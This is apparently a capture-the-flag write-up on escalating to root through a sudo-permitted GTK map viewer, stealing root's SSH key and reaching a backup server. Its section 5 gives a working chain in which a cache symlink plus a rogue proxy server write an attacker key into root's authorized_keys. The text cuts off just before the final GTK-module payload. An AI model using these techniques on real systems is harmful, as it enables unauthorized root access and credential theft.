# Dactyl's Tule Box


```
Dactyl's Tule Box
We just received another report that PROTECTIVE PENGUIN was identified at a company that provides access to mapping software as a service.
The adversary allegedly elevated privileges and then moved laterally to a backup server.

We were provided with a Virtual Machine Image (https://adversaryquest-static.s3.amazonaws.com/oop6eHiu1aezaev3/adversary-quest-mapviewer.qcow2.gz) of the mapping service.
Can you analyze the image and reproduce the attack? If you think you've got it, the victim let us stand up an exact replica of their environment so that you can validate your results:

You can SSH as user customer01 to maps-as-a-service.challenges.adversary.zone on port 4141 using the following SSH private key:
```

Contents
---

1. [Task intro](#a_part1)
2. [Disk Forensics](#a_part2)
3. [Binary analysis of mapviewer](#a_part3)
4. [Reading arbitrary images on the filesystem](#a_part4)
5. [Another unfeasible solution](#a_part5)
6. [GTK obscurity](#a_part6)
7. [Remote pwnage](#a_part7)


---

## 1.<span id="a_part1"/> Task intro

In this task we only have a disk image; no run script, no RAM dump.

```bash
$ qemu-img info adversary-quest-mapviewer.qcow2 
image: adversary-quest-mapviewer.qcow2
file format: qcow2
virtual size: 8 GiB (8589934592 bytes)
disk size: 8 GiB
cluster_size: 65536
Format specific information:
    compat: 1.1
    compression type: zlib
    lazy refcounts: true
    refcount bits: 16
    corrupt: false

```

We know from the challenge text that `The adversary allegedly elevated privileges and then moved laterally to a backup server`. So naturally, what we set out to do is
find some binaries that can offer root privileges within some boundaries and see if we can enlarge those boundaries to have full access. 

## 2.<span id="a_part2"/> Disk Forensics


```bash
$ sudo modprobe nbd
$ sudo qemu-nbd -c /dev/nbd0 -v adversary-quest-mapviewer.qcow2 
NBD device /dev/nbd0 is now connected to adversary-quest-mapviewer.qcow2
$ sudo kpartx -l /dev/nbd0
nbd0p1 : 0 2048 /dev/nbd0 2048
nbd0p2 : 0 2097152 /dev/nbd0 4096
nbd0p3 : 0 14673920 /dev/nbd0 2101248


#testdisk output:

Disk /dev/nbd0 - 8589 MB / 8192 MiB - 16777216 sectors
     Partition               Start        End    Size in sectors
 P Linux filesys. data         4096    2101247    2097152
>P Linux LVM                2101248   16775167   14673920

$ sudo vgscan -v
  Found volume group "ubuntu-vg" using metadata type lvm2

```

Sure enough, we find that the system has automagically added the LVM disk as `ubuntu-vg` and thus we can mount it and see what damage has been wrought under the root user:

```
$ sudo mount /dev/mapper/ubuntu--vg-ubuntu--lv  -o ro mount


# cat .bash_history 
ssh backup@maps-backups.challenges.adversary.zone
```

To reproduce the attack, as the task mentions, we would also need to log on to that machine in the end but no password is given. Maybe there are some SSH keys?

```bash
# ls -al ./root/.ssh/
total 24
drwx------ 2 root root 4096 Jan 18 11:50 .
drwx------ 5 root root 4096 Jan 18 16:17 ..
-rw------- 1 root root   81 Jan 18 11:50 authorized_keys
-rw------- 1 root root  399 Jan 18 11:48 id_ed25519
-rw-r--r-- 1 root root  104 Jan 18 11:49 id_ed25519.pub
-rw-r--r-- 1 root root  200 Jan 18 11:50 known_hosts
# cat ./root/.ssh/id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
-----END OPENSSH PRIVATE KEY-----
# cat ./root/.ssh/id_ed25519.pub 
ssh-ed25519 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX root@maps-as-a-service
```

Now we know our objective: elevating to root, reading the private key file and then SSH-ing to the backup machine. Elevating to root can be done in multiple ways:

 - switching to root (but we don't know the password)
 - through a setuid binary
 - through sudo


No special/vulnerable setuid binaries seem to be present:

```
# find . -xdev -user root \( -perm -4000  \) | xargs ls -latr
-rwsr-xr-x 1 root root  14488 Jul  8  2019 ./usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root  22840 Aug 16  2019 ./usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root  31032 Aug 16  2019 ./usr/bin/pkexec
-rwsr-xr-x 1 root root  39144 Mar  7  2020 ./usr/bin/fusermount
-rwsr-xr-x 1 root root  68208 May 28  2020 ./usr/bin/passwd
-rwsr-xr-x 1 root root  44784 May 28  2020 ./usr/bin/newgrp
-rwsr-xr-x 1 root root  88464 May 28  2020 ./usr/bin/gpasswd
-rwsr-xr-x 1 root root  53040 May 28  2020 ./usr/bin/chsh
-rwsr-xr-x 1 root root  85064 May 28  2020 ./usr/bin/chfn
-rwsr-xr-x 1 root root 473576 May 29  2020 ./usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root kvm   51344 Jun 11  2020 ./usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 166056 Jul 15  2020 ./usr/bin/sudo
-rwsr-xr-x 1 root root  39144 Jul 21  2020 ./usr/bin/umount
-rwsr-xr-x 1 root root  67816 Jul 21  2020 ./usr/bin/su
-rwsr-xr-x 1 root root  55528 Jul 21  2020 ./usr/bin/mount
-rwsr-xr-- 1 root dip  395144 Jul 23  2020 ./usr/sbin/pppd
-rwsr-xr-x 1 root root 130152 Nov 19 18:51 ./usr/lib/snapd/snap-confine
-rwsr-sr-x 1 root root  14488 Dec 18 15:08 ./usr/lib/xorg/Xorg.wrap
```

However, the user customer01 has sudo rights:

```
# cat etc/sudoers.d/10-mapviewer 
customer01 ALL=(ALL) NOPASSWD:/usr/local/bin/mapviewer
```



## 3.<span id="a_part3"/> Binary analysis of mapviewer


Opening it up in IDA we get the overall picture of what it does:

![mapview-ida](./img/mapview-ida.png)


Judging by the code structure and the strings, we can assert the mapviewer is mostly based on https://github.com/nzjrs/osm-gps-map/blob/master/examples/mapviewer.c
with some code removed for some reason or other.

The binary simply loads up images from its designated maps provider and renders them on screen. The additions to the code are a couple of penguins drawn at the south pole:

```
      osm_gps_map_image_add(v9, g_star_image, -74.784332, 71.954956);
      osm_gps_map_image_add(v9, g_star_image, -79.059052, -163.27744);
      osm_gps_map_image_add(v9, g_star_image, -76.307762, 161.13098);
      osm_gps_map_image_add(v9, g_star_image, -78.877472, -24.400635);
      osm_gps_map_image_add(v9, g_star_image, -54.421131, 3.3483479);
```

Here's a preview:

![mapview-normal](./img/mapview-normal.png)


The parts removed have to do with some command line arguments but nothing too important. The final version can be described by calling `--help` on it:

```
$ ./mapviewer  --help
Usage:
  mapviewer [OPTION…] - Map browser

Options:
  -n, --no-cache            Disable cache
  -e, --editable-tracks     Make the tracks editable


Valid map sources:
	0:	None
	1:	OpenStreetMap I
	4:	Maps-For-Free
	5:	OpenCycleMap
	6:	Public Transport
	7:	Google Maps
	8:	Google Satellite
	9:	Google Hybrid
	10:	Virtual Earth
	11:	Virtual Earth Satellite
	12:	Virtual Earth Hybrid
```

As you can see from the nicely rendered help message, there is no way to enter any input at this level.

Now, in the application itself the functionality is also limited to moving around the map, zooming in and out and recaching the images. The following lines catch our attention though:

```
      http_proxy = g_getenv("http_proxy");
      osm_map_type = osm_gps_map_get_type();
      v9 = g_object_new(osm_map_type, "map-source", 7LL, "tile-cache", cache_dir, "tile-cache-base", default_cache_dir, "proxy-uri", http_proxy, 0LL);
```

If we could control the `http_proxy` environment variable we could serve any images we want and maybe do some mischief from there, but the sudoers files puts an end to this avenue:

```
# cat etc/sudoers | grep env
Defaults	env_reset
```




There is one other vulnerability in the binary that could be exploitable in some cases but not this one. Still, it should be presented.


## 4.<span id="a_part4"/> Reading arbitrary images on the filesystem


Looking into the caching mechanism of the application, we see that according to the code it uses the user's default cache directory. With strace we can see exactly what that means:

```
$ strace -if -e file ./mapviewer 2>&1 | grep -F .cache/
[pid 517239] [00007ff0cdb3abc4] openat(AT_FDCWD, "/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/2/1.jpg", O_RDONLY) = -1 ENOENT (No such file or directory)
[pid 517239] [00007ff0cdb3abc4] openat(AT_FDCWD, "/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/2/1.jpg", O_RDONLY) = -1 ENOENT (No such file or directory)
[pid 517239] [00007ff0cdb3abc4] openat(AT_FDCWD, "/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/2/1/0.jpg", O_RDONLY) = -1 ENOENT (No such file or directory)
[pid 517239] [00007ff0cdb3abc4] openat(AT_FDCWD, "/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/1/0/0.jpg", O_RDONLY) = -1 ENOENT (No such file or directory)
[pid 517239] [00007ff0cdb3abc4] openat(AT_FDCWD, "/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/0/0/0.jpg", O_RDONLY) = -1 ENOENT (No such file or directory)
...
[pid 517239] [00007ff0cdb3aa67] mkdir("/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/4/", 0700) = -1 EEXIST (File exists)
[pid 517239] [00007ff0cdb3a306] stat("/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/4/", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
[pid 517239] [00007ff0cdb3abc4] openat(AT_FDCWD, "/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/4/2.jpg", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 18
[pid 517239] [00007ff0cdb3abc4] openat(AT_FDCWD, "/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/4/2.jpg", O_RDONLY) = 18
[pid 517239] [00007ff0cdb3aa67] mkdir("/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/2/", 0700) = -1 EEXIST (File exists)
[pid 517239] [00007ff0cdb3a306] stat("/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/2/", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
[pid 517239] [00007ff0cdb3abc4] openat(AT_FDCWD, "/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/2/2.jpg", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 18
[pid 517239] [00007ff0cdb3abc4] openat(AT_FDCWD, "/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/2/2.jpg", O_RDONLY) = 18
[pid 517239] [00007ff0cdb3aa67] mkdir("/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/4/", 0700) = -1 EEXIST (File exists)
[pid 517239] [00007ff0cdb3a306] stat("/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/4/", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
[pid 517239] [00007ff0cdb3abc4] openat(AT_FDCWD, "/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/4/1.jpg", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 18
[pid 517239] [00007ff0cdb3abc4] openat(AT_FDCWD, "/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/4/1.jpg", O_RDONLY) = 18
[pid 517239] [00007ff0cdb3aa67] mkdir("/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/2/", 0700) = -1 EEXIST (File exists)
[pid 517239] [00007ff0cdb3a306] stat("/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/2/", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
[pid 517239] [00007ff0cdb3abc4] openat(AT_FDCWD, "/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/2/2.jpg", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 18
[pid 517239] [00007ff0cdb3abc4] openat(AT_FDCWD, "/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/2/2.jpg", O_RDONLY) = 18
[pid 517239] [00007ff0cdb3aa67] mkdir("/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/3/", 0700) = -1 EEXIST (File exists)
[pid 517239] [00007ff0cdb3a306] stat("/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/3/", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
[pid 517239] [00007ff0cdb3abc4] openat(AT_FDCWD, "/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/3/1.jpg", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 18
[pid 517239] [00007ff0cdb3abc4] openat(AT_FDCWD, "/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/3/1.jpg", O_RDONLY) = 18
[pid 517239] [00007ff0cdb3aa67] mkdir("/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/2/", 0700) = -1 EEXIST (File exists)
[pid 517239] [00007ff0cdb3a306] stat("/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/2/", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
[pid 517239] [00007ff0cdb3abc4] openat(AT_FDCWD, "/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/2/1.jpg", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 18
[pid 517239] [00007ff0cdb3abc4] openat(AT_FDCWD, "/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/2/1.jpg", O_RDONLY) = 18
[pid 517239] [00007ff0cdb3aa67] mkdir("/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/3/", 0700) = -1 EEXIST (File exists)
[pid 517239] [00007ff0cdb3a306] stat("/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/3/", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
[pid 517239] [00007ff0cdb3abc4] openat(AT_FDCWD, "/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/3/2.jpg", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 18
[pid 517239] [00007ff0cdb3abc4] openat(AT_FDCWD, "/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/3/2.jpg", O_RDONLY) = 18
[pid 517239] [00007ff0cdb3aa67] mkdir("/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/4/", 0700) = -1 EEXIST (File exists)
[pid 517239] [00007ff0cdb3a306] stat("/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/4/", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
[pid 517239] [00007ff0cdb3abc4] openat(AT_FDCWD, "/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/4/2.jpg", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 18
[pid 517239] [00007ff0cdb3abc4] openat(AT_FDCWD, "/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/4/2.jpg", O_RDONLY) = 18
[pid 517239] [00007ff0cdb3aa67] mkdir("/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/4/", 0700) = -1 EEXIST (File exists)
[pid 517239] [00007ff0cdb3a306] stat("/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/4/", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
[pid 517239] [00007ff0cdb3abc4] openat(AT_FDCWD, "/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/4/2.jpg", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 18
[pid 517239] [00007ff0cdb3abc4] openat(AT_FDCWD, "/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/4/2.jpg", O_RDONLY) = 18
[pid 517239] [00007ff0cdb3aa67] mkdir("/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/2/", 0700) = -1 EEXIST (File exists)
[pid 517239] [00007ff0cdb3a306] stat("/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/2/", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
[pid 517239] [00007ff0cdb3abc4] openat(AT_FDCWD, "/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/2/2.jpg", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 18
[pid 517239] [00007ff0cdb3abc4] openat(AT_FDCWD, "/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/2/2.jpg", O_RDONLY) = 18
```


As you can see, the tiles on the globe are organized around a `%d/%d/%d.jpg` scheme. If the files exist, they are rendered; if not, they're retrieved from the provider (Google Maps).


The interesting command line argument is `--no-cache`. What happens then?

```
$ strace -if -e file ./mapviewer --no-cache 2>&1 | grep -F .jpg
[pid 517339] [00007f784f895bc4] openat(AT_FDCWD, "(null)/3/2/1.jpg", O_RDONLY) = -1 ENOENT (No such file or directory)
[pid 517339] [00007f784f895bc4] openat(AT_FDCWD, "(null)/3/2/1.jpg", O_RDONLY) = -1 ENOENT (No such file or directory)
[pid 517339] [00007f784f895bc4] openat(AT_FDCWD, "(null)/2/1/0.jpg", O_RDONLY) = -1 ENOENT (No such file or directory)
[pid 517339] [00007f784f895bc4] openat(AT_FDCWD, "(null)/1/0/0.jpg", O_RDONLY) = -1 ENOENT (No such file or directory)
[pid 517339] [00007f784f895bc4] openat(AT_FDCWD, "(null)/0/0/0.jpg", O_RDONLY) = -1 ENOENT (No such file or directory)
[pid 517339] [00007f784f895bc4] openat(AT_FDCWD, "(null)/3/2/2.jpg", O_RDONLY) = -1 ENOENT (No such file or directory)
[pid 517339] [00007f784f895bc4] openat(AT_FDCWD, "(null)/3/2/2.jpg", O_RDONLY) = -1 ENOENT (No such file or directory)
[pid 517339] [00007f784f895bc4] openat(AT_FDCWD, "(null)/2/1/1.jpg", O_RDONLY) = -1 ENOENT (No such file or directory)
[pid 517339] [00007f784f895bc4] openat(AT_FDCWD, "(null)/1/0/0.jpg", O_RDONLY) = -1 ENOENT (No such file or directory)
[pid 517339] [00007f784f895bc4] openat(AT_FDCWD, "(null)/0/0/0.jpg", O_RDONLY) = -1 ENOENT (No such file or directory)
[pid 517339] [00007f784f895bc4] openat(AT_FDCWD, "(null)/3/3/1.jpg", O_RDONLY) = -1 ENOENT (No such file or directory)
[pid 517339] [00007f784f895bc4] openat(AT_FDCWD, "(null)/3/3/1.jpg", O_RDONLY) = -1 ENOENT (No such file or directory)

```


The `/home/user1/.cache/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/` path has been replaced by a null pointer which is printed as `(null)` by the sprintf function. Note that the path is also not absolute.

This should mean that if we were to create a `(null)/1/0/` directory and add `0.jpg` it should render in the application. Let's try it.


```
$ wget https://upload.wikimedia.org/wikipedia/commons/thumb/1/17/Warning.svg/260px-Warning.svg.png -O \(null\)/1/0/0.jpg
```


![mapview-null](./img/mapview-null.png)



By digging into the gdk internals, I noticed the extension doesn't really matter, so it doesn't have to be a JPEG file.
In fact, all of the following gdk-pixbufloader modules are loaded to see if one matches:

```
./usr/lib/x86_64-linux-gnu/gdk-pixbuf-2.0/2.10.0/loaders/libpixbufloader-ani.so
./usr/lib/x86_64-linux-gnu/gdk-pixbuf-2.0/2.10.0/loaders/libpixbufloader-bmp.so
./usr/lib/x86_64-linux-gnu/gdk-pixbuf-2.0/2.10.0/loaders/libpixbufloader-gif.so
./usr/lib/x86_64-linux-gnu/gdk-pixbuf-2.0/2.10.0/loaders/libpixbufloader-icns.so
./usr/lib/x86_64-linux-gnu/gdk-pixbuf-2.0/2.10.0/loaders/libpixbufloader-ico.so
./usr/lib/x86_64-linux-gnu/gdk-pixbuf-2.0/2.10.0/loaders/libpixbufloader-jpeg.so
./usr/lib/x86_64-linux-gnu/gdk-pixbuf-2.0/2.10.0/loaders/libpixbufloader-png.so
./usr/lib/x86_64-linux-gnu/gdk-pixbuf-2.0/2.10.0/loaders/libpixbufloader-pnm.so
./usr/lib/x86_64-linux-gnu/gdk-pixbuf-2.0/2.10.0/loaders/libpixbufloader-qtif.so
./usr/lib/x86_64-linux-gnu/gdk-pixbuf-2.0/2.10.0/loaders/libpixbufloader-tga.so
./usr/lib/x86_64-linux-gnu/gdk-pixbuf-2.0/2.10.0/loaders/libpixbufloader-tiff.so
./usr/lib/x86_64-linux-gnu/gdk-pixbuf-2.0/2.10.0/loaders/libpixbufloader-xbm.so
./usr/lib/x86_64-linux-gnu/gdk-pixbuf-2.0/2.10.0/loaders/libpixbufloader-xpm.so
./usr/lib/x86_64-linux-gnu/gdk-pixbuf-2.0/2.10.0/loaders/libpixbufloader-svg.so
```

I bet there must be a memory corruption in one of those modules but the task author surely did not intend for us to find one and leverage it.
Another trick that might have worked is if other files could be included using a file format.
For example, I tried abusing the SVG loader which relies on librsvg and there are some cases (https://raw.githubusercontent.com/GNOME/librsvg/master/tests/fixtures/reftests/include-text.svg)
where it is possible to include other text files in the same path and render them inside the SVG.
But again, it doesn't apply to this task, unfortunately.

One important thing to mention is that if the flag for this challenge had been an image (as in other tasks) under root's control, this bug would have provided a means to get it.

As you have seen, when caching is turned off, files are still searched under `(null)/`. If we create a symlink named `(null)/1/0/0.jpg` that points to `/root/flag.png` this file will indeed
get loaded when running with `sudo mapviewer -n`.



## 5.<span id="a_part5"/> Another unfeasible solution


Given what we learned in the previous section, we now know that the caching mechanism follows symlinks.
Assuming we could lift the environment restrictions, is it possible to leverage this issue further in order to gain root access? The scenario would be that `sudo -E mapviewer` could run successfully.

We know that `http_proxy` can be used to serve arbitrary images and these will get stored under the user's cache directory.
But the previous "trick" is read-only, even if we add symlinks, no files get written/overwritten.

Well, there is another environment variable that we could use. According to https://specifications.freedesktop.org/basedir-spec/basedir-spec-latest.html

```
$XDG_CACHE_HOME defines the base directory relative to which user specific non-essential data files should be stored.
If $XDG_CACHE_HOME is either not set or empty, a default equal to $HOME/.cache should be used.
```


```
$ XDG_CACHE_HOME=./test_cache_dir strace -if -e file ./mapviewer  2>&1 | grep -F .jpg
[pid 518934] [00007fa78cb80bc4] openat(AT_FDCWD, "./test_cache_dir/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/2/1.jpg", O_RDONLY) = -1 ENOENT (No such file or directory)
[pid 518934] [00007fa78cb80bc4] openat(AT_FDCWD, "./test_cache_dir/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/2/1.jpg", O_RDONLY) = -1 ENOENT (No such file or directory)
[pid 518934] [00007fa78cb80bc4] openat(AT_FDCWD, "./test_cache_dir/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/2/1/0.jpg", O_RDONLY) = -1 ENOENT (No such file or directory)
[pid 518934] [00007fa78cb80bc4] openat(AT_FDCWD, "./test_cache_dir/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/1/0/0.jpg", O_RDONLY) = -1 ENOENT (No such file or directory)
[pid 518934] [00007fa78cb80bc4] openat(AT_FDCWD, "./test_cache_dir/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/0/0/0.jpg", O_RDONLY) = -1 ENOENT (No such file or directory)
...
[pid 518934] [00007fa78cb80bc4] openat(AT_FDCWD, "./test_cache_dir/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/2/1.jpg", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 18
[pid 518934] [00007fa78cb80bc4] openat(AT_FDCWD, "./test_cache_dir/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/2/1.jpg", O_RDONLY) = 18
[pid 518934] [00007fa78cb80bc4] openat(AT_FDCWD, "./test_cache_dir/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/4/2.jpg", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 18
[pid 518934] [00007fa78cb80bc4] openat(AT_FDCWD, "./test_cache_dir/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/4/2.jpg", O_RDONLY) = 18
[pid 518934] [00007fa78cb80bc4] openat(AT_FDCWD, "./test_cache_dir/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/3/2.jpg", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 18
[pid 518934] [00007fa78cb80bc4] openat(AT_FDCWD, "./test_cache_dir/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/3/2.jpg", O_RDONLY) = 18

$ find ./test_cache_dir/ -type f
./test_cache_dir/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/3/2.jpg
./test_cache_dir/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/3/1.jpg
./test_cache_dir/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/2/2.jpg
./test_cache_dir/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/2/1.jpg
./test_cache_dir/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/4/2.jpg
./test_cache_dir/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/4/1.jpg
```


Now we control both where the files get written and their content (through http_proxy). Would the symlink trick work here as well?

```
$ rm -rf ./test_cache_dir
$ mkdir -p ./test_cache_dir/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/3/
$ chmod 777 -R ./test_cache_dir/
$ ln -s /root/.ssh/authorized_keys2 `pwd`/test_cache_dir/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/3/2.jpg
$ ls -al ./test_cache_dir/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/3/2.jpg
lrwxrwxrwx 1 user1 user1 27 Jan 29 13:23 ./test_cache_dir/osmgpsmap/9c5a9cd9c43537d33143b560fa1bb68d/3/3/2.jpg -> /root/.ssh/authorized_keys2
$ ls -al /root/.ssh/authorized_keys2
ls: cannot access '/root/.ssh/authorized_keys2': Permission denied
$ sudo ls -al /root/.ssh/authorized_keys2
ls: cannot access '/root/.ssh/authorized_keys2': No such file or directory




$ XDG_CACHE_HOME=./test_cache_dir sudo -E ./mapviewer
(mapviewer:519182): OsmGpsMap-WARNING **: 13:26:33.489: Error getting missing tile
(mapviewer:519182): OsmGpsMap-WARNING **: 13:26:33.501: Error getting missing tile
(mapviewer:519182): OsmGpsMap-WARNING **: 13:26:33.502: Error getting missing tile

$ sudo ls -al /root/.ssh/authorized_keys2
-rw-r--r-- 1 root root 4139 Jan 29 13:26 /root/.ssh/authorized_keys2

$ sudo file /root/.ssh/authorized_keys2
/root/.ssh/authorized_keys2: PNG image data, 256 x 256, 8-bit colormap, non-interlaced
```

All we need now is a method to serve arbitrary content in order to add our ssh key.


```python
import http.server
import socketserver
from urllib.parse import urlparse
from urllib.parse import parse_qs
class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        html = f"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDCf8bM2h6FZNN7qhmCNyhleRhV7u2HKC7NUsGxMCMCo\n"
        self.wfile.write(bytes(html, "utf8"))
        return
handler_object = MyHttpRequestHandler
PORT = 8000
my_server = socketserver.TCPServer(("127.0.0.1", PORT), handler_object)
my_server.serve_forever()
```

Let's do it!

```
$ python server.py &
$ http_proxy="http://127.0.0.1:8000" XDG_CACHE_HOME=./test_cache_dir sudo -E ./mapviewer  

(mapviewer:519406): OsmGpsMap-WARNING **: 13:32:22.968: Error getting missing tile

(mapviewer:519406): OsmGpsMap-WARNING **: 13:32:22.981: Error getting missing tile

...
$ sudo cat /root/.ssh/authorized_keys2
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDCf8bM2h6FZNN7qhmCNyhleRhV7u2HKC7NUsGxMCMCo

$ ssh root@127.0.0.1
root@127.0.0.1's password: 
^C

$ ssh -i /tmp/dactyl root@127.0.0.1

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jan 29 13:35:14 2021 from 127.0.0.1
root@debian:~# 
```


We win!.... in this hypothetical situation. But this, unfortunately still does not apply to the task at hand. So what is the solution?


## 6.<span id="a_part6"/> GTK obscurity


As it turns out, the solution is much simpler than what you have seen so far. Knowing that there is solution, we can eliminate attack surfaces one by one. How could an attacker influence the control flow of the program?

 - environment variables: as we have seen, it should have been possible but sudo resets everything
 - standard input: the application does not take any
 - command line arguments: the application only takes two arguments which don't help at all


However, what if there were some hidden command line arguments that the application accepts? Could GTK have some mysteries? According to https://developer.gnome.org/gtk3/stable/gtk-running.html

```
All GTK+ applications support a number of standard commandline options. These are removed from argv by gtk_init().
Modules may parse and remove further options. The X11 and Windows GDK backends parse some additional commandline options.

...
--gtk-module module.  A list of modules to load in addition to those specified in the GTK3_MODULES environment variable and the gtk-modules setting.
```

The final payload is just this:

```c
